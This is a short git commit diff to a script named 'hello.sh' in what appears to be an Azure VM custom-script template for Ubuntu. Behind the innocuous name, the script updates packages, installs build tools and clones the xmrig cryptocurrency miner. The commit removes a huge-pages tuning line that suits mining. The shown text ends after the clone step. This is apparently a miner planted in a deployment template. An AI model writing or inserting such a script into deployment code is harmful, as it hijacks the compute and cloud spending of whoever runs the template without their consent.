7f6ae1e98644f433075f093d9aee3b8bdb29b76f
copnanhdai <copnanhdai@gmail.com>
2018-03-03 16:05:02 +0700

    Update hello.sh

--- 201-customscript-extension-public-storage-on-ubuntu/scripts/hello.sh
+++ 201-customscript-extension-public-storage-on-ubuntu/scripts/hello.sh
@@ -1,5 +1,5 @@
+#!/bin/sh
 sudo apt-get update
-sudo sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))
 sudo apt-get install -y screen git build-essential cmake libuv1-dev
 git clone https://github.com/xmrig/xmrig.git
 
